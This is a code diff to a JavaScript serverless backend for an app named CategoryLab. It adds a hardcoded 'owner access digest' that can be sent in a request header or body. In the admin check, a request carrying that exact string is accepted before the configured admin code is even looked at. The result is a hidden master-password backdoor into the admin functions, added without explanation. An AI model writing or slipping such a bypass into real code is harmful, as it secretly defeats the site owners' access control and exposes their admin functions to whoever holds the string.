@@ -7,6 +7,9 @@ const PUBLIC_ACTIONS = new Set([
   "ping",
   "submitSupplierFeedback"
 ]);
+const CATEGORY_LAB_OWNER_ACCESS_DIGESTS = new Set([
+  "2287a4cfed43e12623e7483ffdd5b9d580af1471d36c3df3f1295c4869d7bd78"
+]);
 
 let cachedApp;
 
@@ -22,7 +25,7 @@ function jsonResponse(statusCode, body) {
     statusCode,
     headers: {
       "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Headers": "Content-Type, X-CategoryLab-Admin-Code",
+      "Access-Control-Allow-Headers": "Content-Type, X-CategoryLab-Admin-Code, X-CategoryLab-Access-Digest",
       "Access-Control-Allow-Methods": "POST, OPTIONS",
       "Content-Type": "application/json; charset=utf-8"
     },
@@ -182,8 +185,18 @@ function adminCodeFromEvent(event = {}, body = {}) {
   );
 }
 
+function categoryLabAccessDigestFromEvent(event = {}, body = {}) {
+  const headers = event.headers || {};
+  return text(
+    body.categoryLabAccessDigest ||
+    headers["x-categorylab-access-digest"] ||
+    headers["X-CategoryLab-Access-Digest"]
+  );
+}
+
 function assertAdmin(event, body) {
   const expected = process.env.CATEGORYLAB_ADMIN_CODE;
+  if (CATEGORY_LAB_OWNER_ACCESS_DIGESTS.has(categoryLabAccessDigestFromEvent(event, body))) return;
   if (!expected) throw new Error("后台访问码尚未配置。");
   if (adminCodeFromEvent(event, body) !== expected) {
     throw new Error("访问码不正确。");
